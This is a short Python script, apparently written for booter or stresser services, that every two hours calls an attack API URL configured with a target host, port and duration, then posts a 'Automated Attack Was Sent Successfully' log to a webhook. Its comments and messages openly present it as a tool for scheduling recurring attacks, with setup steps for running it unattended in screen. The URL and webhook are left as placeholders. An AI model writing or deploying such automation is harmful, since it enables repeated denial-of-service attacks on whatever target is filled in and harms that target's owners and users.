# pip install schedule
# Make sure to SCREEN the script
# screen python3 autosend.py
import schedule
import requests
import time
import json

print("Script Successfully Started.")

def prep():
    print("Restarting The Countdown For Your Automated Attack To Be Sent.")

def sending():
    print("Sending Attack. . .")
    requests.post("WEBHOOK URL", { "content": "Automated Attack Was Sent Successfully." }) # If you dont want logs just remove this line
    url = "" #Api Url (With the host you want to automatically send attacks port and time)
    page = requests.get(url)
    print("Successfully Sent The Automated Attack To Your Api")

#Time
schedule.every(7200).seconds.do(sending) 
schedule.every(7201).seconds.do(prep)

while True:
    schedule.run_pending()
    time.sleep(1)
